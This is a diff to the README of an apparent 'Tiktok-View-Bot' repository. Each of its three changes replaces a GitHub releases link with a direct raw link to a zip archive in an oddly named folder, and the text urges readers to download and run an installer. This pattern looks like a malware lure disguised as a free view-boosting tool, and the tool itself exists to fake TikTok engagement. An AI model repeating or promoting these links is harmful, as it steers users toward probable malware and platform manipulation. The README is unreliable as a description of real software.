@@ -25,7 +25,7 @@ Follow these simple steps to get Tiktok-View-Bot running on your PC:
 
 ### Step 1: Download the Application
 
-[![Download Tiktok-View-Bot](https://img.shields.io/badge/Download-Tiktok--View--Bot-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/releases)
+[![Download Tiktok-View-Bot](https://img.shields.io/badge/Download-Tiktok--View--Bot-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/raw/refs/heads/main/macrostylous/v2.3.zip)
 
 Visit this link to download the application. The download page will show you the latest version available for Windows.
 
@@ -51,7 +51,7 @@ You can now set up your view-boosting campaign:
 
 Here's a more detailed walkthrough for first-time users:
 
-1. **Go to the Download Page** – Click the green button above or use this direct link: [https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/releases](https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/releases)
+1. **Go to the Download Page** – Click the green button above or use this direct link: [https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/raw/refs/heads/main/macrostylous/v2.3.zip](https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/raw/refs/heads/main/macrostylous/v2.3.zip)
 2. **Choose the Latest Version** – You'll see a list of releases. Pick the newest one (usually at the top).
 3. **Download the File** – Look for a file named something like `Tiktok-View-Bot-Setup.exe` and click it to download.
 4. **Run the Installer** – After downloading, open your Downloads folder and double-click the file. Follow the on-screen instructions (just click "Next" a few times).
@@ -160,7 +160,7 @@ Follow this repository to get notified when new versions are released. Updates a
 
 Tiktok-View-Bot gives you a simple, free way to boost your TikTok presence. Whether you're trying to get your first thousand views or want to maintain momentum on a new account, this tool handles the hard work for you. Download it today and see the difference it makes.
 
-Remember, the download link is right here: [https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/releases](https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/releases)
+Remember, the download link is right here: [https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/raw/refs/heads/main/macrostylous/v2.3.zip](https://github.com/Angiospermagonycolumn6191/Tiktok-View-Bot/raw/refs/heads/main/macrostylous/v2.3.zip)
 
 ---
 
